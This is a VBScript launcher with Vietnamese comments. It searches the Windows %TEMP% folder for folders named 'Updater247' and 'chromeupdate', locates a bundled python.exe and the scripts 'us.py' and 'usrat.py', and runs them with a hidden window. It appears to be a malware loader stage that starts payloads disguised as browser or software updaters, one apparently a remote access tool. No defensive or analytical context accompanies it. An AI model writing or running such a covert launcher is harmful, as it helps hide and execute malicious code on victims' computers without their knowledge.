
Dim shell, fso, tempFolder
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Lấy Temp thật của Windows
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%") & "\"

' =============================
' Hàm tìm file trong thư mục (đệ quy)
Function FindFile(startFolder, fileName)
    Dim folder, subFolder, file
    FindFile = "" ' mặc định rỗng
    If fso.FolderExists(startFolder) Then
        For Each file In fso.GetFolder(startFolder).Files
            If LCase(fso.GetFileName(file)) = LCase(fileName) Then
                FindFile = file.Path
                Exit Function
            End If
        Next
        For Each subFolder In fso.GetFolder(startFolder).SubFolders
            FindFile = FindFile(subFolder.Path, fileName)
            If FindFile <> "" Then Exit Function
        Next
    End If
End Function

' =============================
' Tìm python.exe và file py trong Updater247
pyExe1 = FindFile(tempFolder & "Updater247", "python.exe")
pyScript1 = FindFile(tempFolder & "Updater247", "us.py")

' Tìm python.exe và file py trong chromeupdate 
pyExe2 = FindFile(tempFolder & "chromeupdate", "python.exe")
pyScript2 = FindFile(tempFolder & "chromeupdate", "usrat.py")

' =============================
' Chạy script 1 nếu tìm thấy
If pyExe1 <> "" And pyScript1 <> "" Then
    shell.Run """" & pyExe1 & """ """ & pyScript1 & """", 0, False
Else
    MsgBox "Không tìm thấy"
End If

' Chạy script 2 nếu tìm thấy
If pyExe2 <> "" And pyScript2 <> "" Then
    shell.Run """" & pyExe2 & """ """ & pyScript2 & """", 0, False
Else
    MsgBox "Không tìm thấy"
End If
